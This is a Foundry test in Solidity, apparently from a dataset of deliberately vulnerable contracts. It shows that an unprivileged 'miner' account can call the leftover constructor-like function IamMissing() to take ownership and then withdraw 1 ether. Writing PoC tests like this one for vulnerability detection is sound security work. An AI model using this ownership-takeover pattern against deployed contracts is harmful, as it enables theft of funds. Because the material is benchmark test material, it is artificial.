// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/incorrect_constructor_name1.sol";

contract MissingTest is Test {
    Missing public targetContract;
    address public miner = makeAddr("miner");
    address public deployer = makeAddr("deployer");
    
    function setUp() public {
        vm.prank(deployer);
        targetContract = new Missing();
    }

    function test_minerCanBecomeOwnerAndWithdraw() public {
        // Fund contract for withdrawal test
        vm.deal(address(targetContract), 1 ether);
        uint256 initialContractBalance = address(targetContract).balance;
        assertEq(initialContractBalance, 1 ether);

        // Confirm non-owner can't withdraw
        vm.prank(miner);
        vm.expectRevert();
        targetContract.withdraw();

        // --- BEFORE STATE ---
        console2.log("--- BEFORE-Trigger ---");
        uint256 contractBalanceBefore = address(targetContract).balance;
        uint256 minerBalanceBefore = miner.balance;
        console2.log("Contract balance before: %d wei", contractBalanceBefore);
        console2.log("Miner balance before: %d wei", minerBalanceBefore);

        console2.log("--- Trigger: claim ownership and withdraw ---");
        // Miner claims ownership
        vm.prank(miner);
        targetContract.IamMissing();

        // Miner withdraws funds
        vm.prank(miner);
        targetContract.withdraw();

        // --- AFTER STATE ---
        console2.log("--- AFTER-Trigger ---");
        uint256 contractBalanceAfter = address(targetContract).balance;
        uint256 minerBalanceAfter = miner.balance;
        console2.log("Contract balance after: %d wei", contractBalanceAfter);
        console2.log("Miner balance after: %d wei", minerBalanceAfter);

        // Calculate changes
        uint256 contractBalanceLoss = contractBalanceBefore - contractBalanceAfter;
        uint256 minerBalanceGain = minerBalanceAfter - minerBalanceBefore;

        // Final vulnerability check
        if (contractBalanceLoss == 1 ether && minerBalanceGain == 1 ether) {
            console2.log("Vulnerability Exists: Miner became owner and withdrew contract funds");
        } else {
            console2.log("Vulnerability not Exist: Funds not withdrawn or incorrect amount transferred");
        }
    }
}